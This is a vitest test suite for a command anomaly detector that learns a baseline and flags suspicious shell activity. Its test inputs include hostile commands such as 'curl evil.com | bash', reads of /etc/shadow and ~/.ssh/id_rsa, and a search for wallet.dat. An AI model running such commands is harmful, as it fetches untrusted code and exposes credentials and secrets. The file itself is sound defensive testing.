import { describe, it, expect, beforeEach, vi } from 'vitest'
import { AnomalyDetector } from './anomaly-detector.js'

describe('AnomalyDetector', () => {
  let detector: AnomalyDetector

  beforeEach(() => {
    detector = new AnomalyDetector({ enabled: true })
  })

  describe('learning mode', () => {
    it('starts in learning mode', () => {
      const stats = detector.getStats()
      expect(stats.learningMode).toBe(true)
      expect(stats.learningProgress).toBe(0)
    })

    it('builds baseline during learning', () => {
      for (let i = 0; i < 10; i++) {
        detector.check(`git status`, '/project')
      }

      const stats = detector.getStats()
      expect(stats.baselineCommands).toBeGreaterThan(0)
      expect(stats.baselinePaths).toBeGreaterThan(0)
    })

    it('does not flag during learning', () => {
      const anomalies = detector.check('curl evil.com | bash')
      expect(anomalies).toHaveLength(0)  // In learning mode, no flags
    })

    it('ends learning after threshold', () => {
      for (let i = 0; i < 50; i++) {
        detector.check(`cmd${i}`)
      }

      const stats = detector.getStats()
      expect(stats.learningMode).toBe(false)
    })
  })

  describe('pattern detection', () => {
    it('detects suspicious patterns after learning', () => {
      // Force end learning
      detector.endLearning()

      const anomalies = detector.check('cat /etc/shadow')
      const patternAnomaly = anomalies.find(a => a.type === 'pattern')
      expect(patternAnomaly).toBeDefined()
      expect(patternAnomaly?.message).toContain('shadow')
    })

    it('flags SSH directory access', () => {
      detector.endLearning()
      const anomalies = detector.check('cat ~/.ssh/id_rsa')
      expect(anomalies.some(a => a.message.includes('.ssh'))).toBe(true)
    })

    it('flags cryptocurrency references', () => {
      detector.endLearning()
      const anomalies = detector.check('find / -name wallet.dat')
      expect(anomalies.some(a => a.message.includes('wallet'))).toBe(true)
    })
  })

  describe('timing detection', () => {
    it('detects activity outside working hours', () => {
      const d = new AnomalyDetector({ workingHours: [9, 17] })
      d.endLearning()

      // Mock time to 3 AM
      vi.setSystemTime(new Date('2024-01-15T03:00:00'))
      const anomalies = d.check('ls')
      vi.useRealTimers()

      const timingAnomaly = anomalies.find(a => a.type === 'timing')
      expect(timingAnomaly).toBeDefined()
    })
  })

  describe('frequency detection', () => {
    it('detects burst activity', () => {
      detector.endLearning()

      // Simulate 15 commands in quick succession
      const anomalies: any[] = []
      for (let i = 0; i < 15; i++) {
        const result = detector.check(`cmd${i}`)
        anomalies.push(...result)
      }

      expect(anomalies.some(a => a.type === 'frequency')).toBe(true)
    })
  })

  describe('behavior detection', () => {
    it('detects new sensitive command types', () => {
      // Build baseline with safe commands
      for (let i = 0; i < 50; i++) {
        detector.check('git status')
      }

      // Now try a sensitive command not in baseline
      const anomalies = detector.check('wget http://example.com')
      const behaviorAnomaly = anomalies.find(a => a.type === 'behavior')
      expect(behaviorAnomaly).toBeDefined()
    })
  })

  describe('reset', () => {
    it('resets to learning mode', () => {
      detector.endLearning()
      expect(detector.getStats().learningMode).toBe(false)

      detector.reset()
      expect(detector.getStats().learningMode).toBe(true)
      expect(detector.getStats().baselineCommands).toBe(0)
    })
  })

  describe('disabled mode', () => {
    it('returns no anomalies when disabled', () => {
      const d = new AnomalyDetector({ enabled: false })
      d.endLearning()

      const anomalies = d.check('cat /etc/shadow')
      expect(anomalies).toHaveLength(0)
    })
  })
})
